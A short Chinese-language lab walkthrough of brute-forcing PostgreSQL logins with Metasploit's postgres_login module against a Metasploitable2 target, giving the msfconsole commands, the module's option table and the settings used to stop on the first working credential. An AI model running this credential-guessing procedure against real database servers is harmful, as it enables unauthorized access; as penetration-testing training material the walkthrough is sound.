## 暴力破解postgres密码
0、工具
- metasploit3

1、进入metasploit3 shell环境
```bash 
[root@kali: ~#] msfconsole
msf > search postgres
auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
#找到一个postgres登录的辅助
msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(postgres_login) > show options
Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                                               Required  Description
   ----              ---------------                                                               --------  -----------
   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                                                     yes       The database to authenticate against
   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
   PASSWORD                                                                                        no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
   RHOSTS            metasploitable2                                                               yes       The target address range or CIDR identifier
   RPORT             5432                                                                          yes       The target port
   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
   THREADS           1                                                                             yes       The number of concurrent threads
   USERNAME          postgres                                                                      no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
   VERBOSE           true                                                                          yes       Whether to print output for all attempts
msf auxiliary(postgres_login) > set RHOSTS metasploit2
#登录成功后就退出
msf auxiliary(postgres_login) > set STOP_ON_SUCCESS true
msf auxiliary(postgres_login) > set USER_AS_PASS true
#注意密码文件和用户名的文件自行添加。
#metasploitable2使用的默认账号密码，所以直接执行就能成功登录。
msf auxiliary(postgres_login) > exploit
#如果用户密码很多，可能需要等很久滴！！！！
#继续进入下一步
```